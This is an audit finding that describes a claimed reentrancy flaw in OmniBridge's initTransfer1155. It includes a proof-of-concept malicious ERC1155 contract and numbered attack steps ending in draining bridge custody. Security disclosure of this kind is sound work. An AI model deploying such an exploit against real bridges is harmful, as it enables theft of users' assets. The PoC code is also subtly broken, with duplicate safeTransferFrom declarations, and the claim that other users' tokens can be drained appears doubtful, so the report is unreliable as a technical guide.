### Title
Reentrancy in `initTransfer1155` via Attacker-Controlled ERC1155 Callback Allows Unbacked Token Minting on NEAR - (File: evm/src/omni-bridge/contracts/OmniBridge.sol)

---

### Summary

`OmniBridge.initTransfer1155` makes an external call to an attacker-supplied ERC1155 contract address via `safeTransferFrom` with no reentrancy guard. Because ERC1155's `safeTransferFrom` triggers an `onERC1155Received` callback on the recipient (the bridge itself), a malicious ERC1155 contract can reenter `initTransfer1155` before the `InitTransfer` event is emitted. Each reentrant invocation increments `currentOriginNonce` and emits a fresh, valid `InitTransfer` event. The NEAR bridge processes each event independently and mints tokens for each, while the attacker deposits tokens only once (or zero times).

---

### Finding Description

`initTransfer1155` accepts an arbitrary `tokenAddress` from the caller. The function:

1. Increments `currentOriginNonce` (line 448)
2. Calls `IERC1155(tokenAddress).safeTransferFrom(msg.sender, address(this), tokenId, amount, "")` (line 458) — an external call to a fully attacker-controlled contract
3. Calls `initTransferExtension` (line 468) and emits `InitTransfer` (line 480) **after** the external call returns [1](#0-0) 

There is no `nonReentrant` modifier or any equivalent reentrancy lock anywhere in the EVM contracts (confirmed by grep: zero matches for `nonReentrant` or `ReentrancyGuard` across all `.sol` files in scope).

The bridge's `onERC1155Received` guard checks `operator != address(this)` and reverts if the operator is not the bridge: [2](#0-1) 

This guard is **ineffective** against reentrancy because:
- In `initTransfer1155`, the bridge itself calls `safeTransferFrom`, making `operator == address(this)`. The malicious ERC1155 can invoke `onERC1155Received(address(this), ...)` on the bridge and it passes.
- Alternatively, the malicious ERC1155 can skip calling `onERC1155Received` entirely (it controls its own implementation) and simply reenter `initTransfer1155` directly from within its `safeTransferFrom` body.

**Reentrant execution trace:**

```
Attacker → initTransfer1155(maliciousERC1155, tokenId, amount, ...)
  currentOriginNonce → N
  maliciousERC1155.safeTransferFrom(attacker, bridge, ...)
    [reenter] → initTransfer1155(maliciousERC1155, tokenId, amount, ...)
      currentOriginNonce → N+1
      maliciousERC1155.safeTransferFrom(...)  ← returns without reentering
      emit InitTransfer(nonce=N+1)            ← valid on-chain event
    [reenter returns]
  emit InitTransfer(nonce=N)                  ← valid on-chain event
```

Both `InitTransfer` events with nonces N and N+1 are valid EVM log entries. The NEAR bridge's `fin_transfer` verifies a Merkle/light-client proof of each event independently and mints tokens for each nonce. The attacker deposited tokens at most once but receives NEAR-side tokens twice (or more, with deeper recursion).

---

### Impact Explanation

**Critical — Unauthorized mint of bridged assets and theft of other users' ERC1155 tokens.**

The attacker mints unbacked NEAR-side tokens for each fake `InitTransfer` event. They then bridge those tokens back to EVM via `init_transfer` on NEAR, causing the EVM bridge to release ERC1155 tokens from its custody that were deposited by legitimate users. This drains the bridge's ERC1155 reserves without a corresponding deposit, constituting direct theft of bridged assets.

---

### Likelihood Explanation

**High.** The entry point is fully permissionless — any address can call `initTransfer1155` with any `tokenAddress`. Deploying a malicious ERC1155 contract costs only gas. No privileged role, leaked key, or off-chain coordination is required. The only prerequisite is registering the token via `logMetadata1155` (also permissionless) so the NEAR side recognizes it. [3](#0-2) 

---

### Recommendation

Add OpenZeppelin's `ReentrancyGuardUpgradeable` to `OmniBridge` and apply `nonReentrant` to `initTransfer`, `initTransfer1155`, and `finTransfer`. Following the analog report's best practice, `nonReentrant` must be the **first** modifier listed on each function, before `whenNotPaused`, to ensure the lock is set before any other modifier or function body logic executes.

```solidity
// Example fix
import {ReentrancyGuardUpgradeable} from
    "@openzeppelin/contracts-upgradeable/utils/ReentrancyGuardUpgradeable.sol";

contract OmniBridge is
    UUPSUpgradeable,
    AccessControlUpgradeable,
    ReentrancyGuardUpgradeable,   // add
    SelectivePausableUpgradable,
    IERC1155Receiver
{ ... }

function initTransfer1155(...) external payable nonReentrant whenNotPaused(PAUSED_INIT_TRANSFER) { ... }
function initTransfer(...)    external payable nonReentrant whenNotPaused(PAUSED_INIT_TRANSFER) { ... }
function finTransfer(...)     external payable nonReentrant whenNotPaused(PAUSED_FIN_TRANSFER)  { ... }
```

pragma solidity ^0.8.24;

import {IERC1155Receiver} from "@openzeppelin/contracts/token/ERC1155/IERC1155Receiver.sol";

interface IOmniBridge {
    function initTransfer1155(
        address tokenAddress,
        uint256 tokenId,
        uint128 amount,
        uint128 fee,
        uint128 nativeFee,
        string calldata recipient,
        string calldata message
    ) external payable;
}

contract MaliciousERC1155 {
    IOmniBridge public bridge;
    uint256 public depth;
    uint256 public constant MAX_DEPTH = 3;

    constructor(address _bridge) {
        bridge = IOmniBridge(_bridge);
    }

    // Called by OmniBridge.initTransfer1155 as IERC1155(tokenAddress).safeTransferFrom(...)
    function safeTransferFrom(
        address, address, uint256, uint256, bytes calldata
    ) external {
        if (depth < MAX_DEPTH) {
            depth++;
            // Reenter initTransfer1155 — each call increments currentOriginNonce
            // and will emit a fresh InitTransfer event after this call returns
            bridge.initTransfer1155{value: 0}(
                address(this), 1, 100, 0, 0, "attacker.near", ""
            );
            depth--;
        }
        // Return without actually transferring any tokens
    }

    // Satisfy IERC1155 interface minimally
    function balanceOf(address, uint256) external pure returns (uint256) { return 1e18; }
    function isApprovedForAll(address, address) external pure returns (bool) { return true; }
    function setApprovalForAll(address, bool) external {}
    function safeTransferFrom(address,address,uint256,uint256,bytes memory) external {}
    function safeBatchTransferFrom(address,address,uint256[] memory,uint256[] memory,bytes memory) external {}
    function balanceOfBatch(address[] memory,uint256[] memory) external pure returns (uint256[] memory r) {}
    function supportsInterface(bytes4) external pure returns (bool) { return true; }
}

// Attack steps:
// 1. Deploy MaliciousERC1155(bridgeAddress)
// 2. Call bridge.logMetadata1155(maliciousERC1155, 1) to register token on NEAR
// 3. Call maliciousERC1155-initiated bridge.initTransfer1155(maliciousERC1155, 1, 100, 0, 0, "attacker.near", "")
// 4. Observe MAX_DEPTH+1 distinct InitTransfer events emitted on-chain with consecutive nonces
// 5. Submit proofs of each event to NEAR bridge.fin_transfer → NEAR mints tokens for each
// 6. Bridge NEAR tokens back to EVM → drain other users' ERC1155 tokens from bridge custody
